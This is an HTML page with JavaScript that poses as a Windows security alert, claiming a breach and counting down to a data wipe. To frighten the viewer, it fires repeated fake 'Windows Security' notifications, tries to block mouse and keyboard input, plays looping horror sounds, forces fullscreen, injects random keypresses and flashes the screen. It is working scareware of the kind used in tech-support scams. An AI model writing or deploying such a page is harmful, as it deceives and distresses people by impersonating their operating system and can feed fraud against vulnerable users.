<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Threat Detected</title>
    <style>
        body {
            background: black;
            color: red;
            font-family: monospace;
            text-align: center;
            margin: 0;
            overflow: hidden;
        }
        #warning {
            padding-top: 10%;
            font-size: 24px;
            animation: glitch 0.2s infinite alternate;
        }
        @keyframes glitch {
            0% { transform: translateX(0); }
            20% { transform: translateX(-5px) skewX(-10deg); }
            40% { transform: translateX(5px) skewX(10deg); }
            60% { transform: translateX(-5px) skewX(-10deg); }
            80% { transform: translateX(5px) skewX(10deg); }
            100% { transform: translateX(0); }
        }
        #countdown {
            font-size: 40px;
            font-weight: bold;
            color: white;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div id="warning">
        <h1>⚠ CRITICAL SYSTEM ALERT ⚠</h1>
        <p>Windows has detected a security breach.</p>
        <p>Unauthorized remote access detected.</p>
        <p>Data integrity compromised.</p>
        <p>Automatic system wipe in:</p>
        <p id="countdown">10</p>
        <p><strong>DO NOT TURN OFF YOUR COMPUTER</strong></p>
        <p>Error Code: <strong>0xDEADDEAD - Critical Kernel Failure</strong></p>
    </div>

    <audio id="horrorSound" src="https://www.fesliyanstudios.com/play-mp3/6666" loop></audio>
    <audio id="glitchSound" src="https://www.fesliyanstudios.com/play-mp3/11112" loop></audio>

    <script>
        function requestNotificationPermission() {
            if ("Notification" in window) {
                Notification.requestPermission();
            }
        }

        function sendNotification() {
            if (Notification.permission === "granted") {
                new Notification("⚠ Windows Security Alert ⚠", {
                    body: "Unauthorized access detected. Possible ransomware attack.",
                    icon: "https://upload.wikimedia.org/wikipedia/commons/e/e7/Windows_Defender_logo.svg"
                });
            }
        }

        function startNotifications() {
            setInterval(sendNotification, 5000); // Send notification every 5 seconds
        }

        function freezeMouseAndKeyboard() {
            document.onmousemove = function() { return false; };
            document.onkeydown = function() { return false; };
        }

        function playScarySounds() {
            document.getElementById("horrorSound").play();
            document.getElementById("glitchSound").play();
        }

        function forceFullScreen() {
            document.documentElement.requestFullscreen().catch(console.log);
        }

        function typeRandomKeys() {
            let keys = ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h"];
            setInterval(() => {
                let event = new KeyboardEvent("keydown", { key: keys[Math.floor(Math.random() * keys.length)] });
                document.dispatchEvent(event);
            }, 300);
        }

        function startCountdown() {
            let count = 10;
            let countdownElement = document.getElementById("countdown");
            let countdown = setInterval(() => {
                count--;
                countdownElement.textContent = count;
                if (count <= 0) {
                    clearInterval(countdown);
                    countdownElement.textContent = "DATA WIPE INITIATED";
                }
            }, 1000);
        }

        function glitchScreen() {
            setInterval(() => {
                document.body.style.background = document.body.style.background === "black" ? "darkred" : "black";
                document.body.style.color = document.body.style.color === "red" ? "white" : "red";
            }, 500);
        }

        requestNotificationPermission();
        setTimeout(startNotifications, 2000);
        setTimeout(freezeMouseAndKeyboard, 4000);
        setTimeout(playScarySounds, 6000);
        setTimeout(forceFullScreen, 8000);
        setTimeout(typeRandomKeys, 9000);
        setTimeout(startCountdown, 10000);
        setTimeout(glitchScreen, 11000);
    </script>
</body>
</html>
